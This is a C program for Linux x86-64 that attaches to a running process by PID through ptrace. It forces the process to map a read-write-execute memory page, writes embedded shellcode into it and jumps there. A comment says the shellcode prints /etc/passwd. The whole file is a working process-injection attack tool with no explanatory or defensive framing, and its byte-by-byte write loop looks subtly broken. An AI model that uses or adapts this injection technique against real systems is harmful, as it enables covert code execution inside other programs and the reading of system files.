#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <stdint.h>
#include <sys/mman.h>

// cat /etc/passwd shellcode
char shellcode[] = {
    0x68, 0x72, 0x76, 0x65, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x48, 0xb8, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x50, 0x6a, 0x2, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x99, 0xf, 0x5, 0x41, 0xba, 0xff, 0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a, 0x28, 0x58, 0x6a, 0x1, 0x5f, 0x99, 0xf, 0x5
};

int main(int32_t argc, char **argv)
{
    pid_t pid;
    struct user_regs_struct regs;
    uint64_t ins;
    uint64_t syscall = 0xcccc050f;
    char *rwx_page;
    uint32_t i;

    if (argc != 2) exit(1);

    pid = atoi(argv[1]);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
    {
        perror("ptrace");
        exit(1);
    }

    wait(NULL);

    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    ptrace(PTRACE_POKETEXT, pid, regs.rip, syscall);

    regs.rax = 9; // mmap
    regs.rdi = NULL;
    regs.rsi = 4096;
    regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;
    regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;
    regs.r8 = 0;
    regs.r9 = 0;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    ptrace(PTRACE_CONT, pid, NULL, NULL);
    wait(NULL);

    ptrace(PTRACE_GETREGS, pid, NULL, &regs);

    rwx_page = regs.rax;
    if (rwx_page <= NULL)
    {
        printf("Something went wrong!\n");
        exit(1);
    }

    for (i = 0; i < sizeof(shellcode); i++)
    {
        ptrace(PTRACE_POKETEXT, pid, rwx_page + i, shellcode[i]);
    }

    regs.rip = rwx_page;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    ptrace(PTRACE_CONT, pid, NULL, NULL);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    return 0;
}
